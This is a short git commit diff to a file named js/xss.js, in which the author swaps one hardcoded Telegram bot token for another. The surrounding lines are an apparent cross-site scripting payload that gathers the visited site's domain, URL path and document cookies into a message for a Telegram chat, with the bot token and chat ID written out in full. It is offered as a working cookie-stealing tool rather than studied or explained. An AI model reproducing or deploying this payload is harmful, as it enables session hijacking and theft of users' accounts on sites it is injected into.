e6332f1af569ed82fa6fb9cd9ecc2161b6c5ead4
Bayu Putra Herlambang <65327648+bayuputra18@users.noreply.github.com>
2022-01-20 13:07:14 +0700

    Update xss.js

--- js/xss.js
+++ js/xss.js
@@ -1,4 +1,4 @@
-var tokenBot = '1915000755:AAGyTtnx1GnPGgdIU3W2LQx6ahh97Jsp_WY'; 
+var tokenBot = '5182173476:AAHIXMha-SawXM3QP3BBpoXJmZhIC6fNQWA'; 
 var chatId = '904419645';
 function telegramSend(tokenBot, chatId) {
 	var textData = '<b>Halo+ada+akses+ke+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
